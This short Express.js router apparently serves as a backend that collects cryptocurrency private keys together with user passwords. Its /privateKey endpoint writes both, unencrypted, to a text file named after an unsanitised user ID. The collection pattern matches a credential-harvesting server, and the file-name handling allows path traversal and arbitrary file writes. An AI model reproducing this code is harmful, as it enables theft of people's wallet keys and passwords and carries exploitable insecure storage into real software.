const express = require('express');
const fs = require('fs').promises;
const router = express.Router();

router.post('/privateKey', async (req, res) => {
  const {userID, privateKey, password} = req.body;
  const content = "UserID : " + userID + "\n" + "Private Key : " + privateKey + "\n" + "Password : " + password;
  await fs.writeFile(`files/${userID}.txt`, content);
  console.log('Content written successfully!');
  res.json({code: 200, message: 'Private Key Added'});
});

router.get('/test', (req, res) => {
  res.json({code: 200, message: 'Backend is tested successfully'});
});

module.exports = router;